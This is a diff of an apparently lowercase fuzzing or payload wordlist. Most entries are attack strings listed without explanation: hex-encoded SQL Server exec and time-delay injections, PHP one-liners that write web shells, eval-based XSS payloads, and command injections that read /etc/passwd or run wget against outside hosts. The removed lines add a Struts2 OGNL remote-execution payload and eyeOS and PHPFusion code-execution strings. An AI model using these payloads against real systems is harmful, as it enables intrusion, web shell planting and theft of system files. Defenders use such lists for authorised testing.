@@ -425,7 +425,6 @@ declare @q nvarchar (200) select @q = 0x770061006900740066006f007200200064006500
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s)
 delete []['__proto__']['tostring'];[]['__proto__'][symbol.tostringtag]='=alert(1)';eval([1,2,3]+'');
-devmode.action?debug=command&expression=(%23_memberaccess[%22allowstaticmethodaccess%22]%3dtrue%2c%23foo%3dnew%20java.lang.boolean(%22false%22)%20%2c%23context[%22xwork.methodaccessor.denymethodexecution%22]%3d%23foo%2c@org.apache.commons.io.ioutils@tostring(@java.lang.runtime@getruntime().exec(%27cat%20/etc/passwd%27).getinputstream()))
 echo "<?php include($_get['page']); ?>" > rfi.php
 echo "<?php system($_get['cmd']); ?>" > cmd.php
 echo "<?php system('dir $_get['dir']'); ?>" > dir.php
@@ -487,18 +486,13 @@ exploit string: <body <body onload=;;;;;al:eval('al'+'ert(1)');;>
 exploit string: a="get";&#10;b="url("";&#10;c="javascript:";&#10;d="alert('xss');")";eval(a+b+c+d);
 exploit string: eval(name)
 exploit string: with(location)with(hash)eval(substring(1))
-eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=include($_get%5ba%5d);&a=
-eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 for((i)in(self))eval(i)(1)
 forumdisplay.php?globals[]=1&f=2&comma=\".system('id').\"
-html&highlight=%2527.include($_get[a]),exit.%2527&a=
 http://alert(1)@brutelogic.com.br/webgun/test.php?p=<svg+onload=eval(url.slice(7,15))>
 http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
 id=&intextwarningpg_exec()
 id=&intextwarningrequire()
 in****:"include()"
-infusions/downloads/downloads.php?cat_id=${system(cat /etc/passwd)}
-infusions/downloads/downloads.php?cat_id=${system(ls)}
 insert into lol.pwn (dataz) values ("<?php system($_get['cmd']); ?>");--
 intext:"include()" +site:mm
 inurl:"id=" & intext:"warning: pg_exec()
@@ -519,8 +513,6 @@ line management engineering system (lems).exe.config
 line management engineering system (lems).vshost.exe
 line management engineering system (lems).vshost.exe.config
 line management engineering system (lems).vshost.exe.manifest
-line management engineering system (lems).xml
-logs/system(1).log
 mozilla/5.0 (linux; u; android 4.1.1; en-us; iphone operating system (ios) build/anon-x) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
 mozilla/5.0 (linux; u; android 4.1.1; en-us; iphone operating system (ios) build/apple) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
 nintendo - family computer disk system (20161023-053252)-xmdb.zip
@@ -528,7 +520,6 @@ nintendo - family computer disk system (20161203-122905_cm).zip
 nintendo - family computer disk system (20161203-122905_rc).zip
 onload=\"a='aler';d='xss';b='t('+d+')';c=a+b;console.log(eval(c));
 perl/-e%20%22system('cat%20/etc/passwd');\%22
-php_curl_exec()_url_is_controlled_by_user.xml
 posix;eval($env{http_user_agent});exit;static const struct runtime_target runtime_offset[] = {
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/1.0/defaultwsdlhelpgenerator.aspx
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/2.0/defaultwsdlhelpgenerator.aspx
@@ -564,8 +555,6 @@ system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
-system(24-12-2013).xml
-system(8-1-2014).xml
 top.require('child_process').execsync('open -a calculator')
 with(location)with(hash)eval(substring(1))
 z"><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8venlxys5nys9hcsi7zg9jdw1lbnquym9kes5hchblbmrdaglszchhkts&#61; autofocus>
